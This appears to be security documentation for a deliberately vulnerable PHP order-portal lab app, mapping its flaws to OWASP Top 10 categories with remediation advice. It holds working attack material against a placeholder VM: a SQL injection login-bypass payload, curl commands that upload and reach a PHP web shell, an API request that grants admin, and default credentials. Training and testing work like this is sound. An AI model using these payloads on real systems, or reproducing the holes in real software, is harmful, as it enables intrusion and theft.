# Vulnerability Documentation

## OWASP Top 10 Mappings

### A01:2021 - Broken Access Control

#### 1. Unprotected Admin Dashboard
- **File**: `admin/dashboard.php`
- **Severity**: Critical
- **Description**: Admin panel accessible without authentication
- **Exploit**: Direct URL access bypasses login
- **Impact**: Full system compromise, data breach
- **Reproduction**:
  ```
  GET /order-portal/admin/dashboard.php
  ```

#### 2. Horizontal Privilege Escalation
- **File**: `customer/orders.php`
- **Severity**: High
- **Description**: User ID parameter manipulation
- **Exploit**: Change `user_id` parameter to access other users' data
- **Impact**: Customer data breach
- **Reproduction**:
  ```
  GET /order-portal/customer/orders.php?user_id=3
  ```

#### 3. Vertical Privilege Escalation
- **File**: `api/user.php`
- **Severity**: Critical
- **Description**: Role elevation via API
- **Exploit**: POST request to change user role
- **Impact**: Admin access for regular users
- **Reproduction**:
  ```
  POST /order-portal/api/user.php
  Content-Type: application/json
  {"user_id": 2, "role": "admin"}
  ```

### A02:2021 - Cryptographic Failures

#### 1. Plaintext Password Storage
- **File**: `config/database.php`
- **Severity**: Critical
- **Description**: Passwords stored without hashing
- **Impact**: Credential theft if database compromised
- **Verification**: Query users table directly

#### 2. Weak Hashing (MD5)
- **File**: `includes/upload.php`
- **Severity**: Medium
- **Description**: MD5 used for session tokens
- **Impact**: Session hijacking, token prediction
- **Code**: `md5($user_id . time())`

#### 3. Missing HTTPS
- **Severity**: Medium
- **Description**: No SSL/TLS encryption
- **Impact**: Data interception, credential theft
- **Fix**: Configure proper SSL certificate

### A05:2021 - Security Misconfiguration

#### 1. Default Credentials
- **Severity**: High
- **Description**: Weak default passwords
- **Credentials**:
  - MySQL: `root:root`
  - Admin: `admin:admin`
  - Customer: `customer:customer`

#### 2. Debug Information Exposure
- **File**: `debug/phpinfo.php`
- **Severity**: Medium
- **Description**: PHP configuration exposed
- **Impact**: Information disclosure
- **URL**: `/order-portal/debug/phpinfo.php`

#### 3. Directory Listing Enabled
- **Directory**: `uploads/`
- **Severity**: Low
- **Description**: Apache directory browsing enabled
- **Impact**: File enumeration
- **Configuration**: `Options +Indexes`

#### 4. Missing Security Headers
- **Severity**: Medium
- **Description**: No HSTS, CSP, X-Frame-Options
- **Impact**: XSS, clickjacking vulnerabilities
- **Headers Missing**:
  - `Strict-Transport-Security`
  - `Content-Security-Policy`
  - `X-Frame-Options`
  - `X-Content-Type-Options`

### A06:2021 - Vulnerable Components

#### 1. Outdated jQuery
- **Component**: jQuery 1.8.3
- **CVEs**: CVE-2020-11022, CVE-2020-11023
- **Severity**: Medium
- **Description**: XSS vulnerabilities in jQuery
- **File**: `js/jquery-1.8.3.min.js`

#### 2. Vulnerable File Upload
- **File**: `includes/upload.php`
- **Severity**: Critical
- **Description**: Path traversal in file uploads
- **Impact**: Remote code execution
- **Exploit**: Upload `../../../shell.php`

#### 3. Outdated PHP
- **Version**: PHP 7.4
- **Severity**: Medium
- **Description**: Known vulnerabilities in PHP version
- **Impact**: Various security issues

### A03:2021 - Injection (SQL Injection)

#### 1. Login Form SQL Injection
- **File**: `index.php`
- **Severity**: Critical
- **Description**: Unsanitized SQL query
- **Impact**: Database compromise, authentication bypass
- **Payload**: `admin' OR '1'='1' --`
- **Code**: `SELECT * FROM users WHERE username = '$username' AND password = '$password'`

#### 2. Orders Page SQL Injection
- **File**: `customer/orders.php`
- **Severity**: High
- **Description**: Direct parameter insertion
- **Impact**: Data extraction
- **Code**: `SELECT * FROM orders WHERE user_id = $user_id`

## Exploitation Examples

### SQL Injection Authentication Bypass
```sql
Username: admin' OR '1'='1' --
Password: anything
```

### File Upload Path Traversal
```bash
# Upload malicious PHP file
curl -F "file=@shell.php" http://[VM-IP]/order-portal/customer/upload.php

# Access uploaded shell
curl http://[VM-IP]/order-portal/uploads/shell.php
```

### API Privilege Escalation
```bash
# Escalate user 2 to admin
curl -X POST http://[VM-IP]/order-portal/api/user.php \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "role": "admin"}'
```

### Information Disclosure
```bash
# View all users via API
curl http://[VM-IP]/order-portal/api/user.php

# Access debug information
curl http://[VM-IP]/order-portal/debug/phpinfo.php
```

## Remediation Guidelines

### Immediate Fixes
1. Implement proper authentication checks
2. Use parameterized queries for SQL
3. Hash passwords with bcrypt
4. Validate file uploads
5. Remove debug pages
6. Update vulnerable components

### Security Headers
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set Content-Security-Policy "default-src 'self'"
```

### Input Validation
```php
// Proper SQL query
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $hashed_password);
```

## Testing Tools
- **Burp Suite**: Web application testing
- **SQLMap**: SQL injection testing
- **OWASP ZAP**: Vulnerability scanning
- **Nikto**: Web server scanning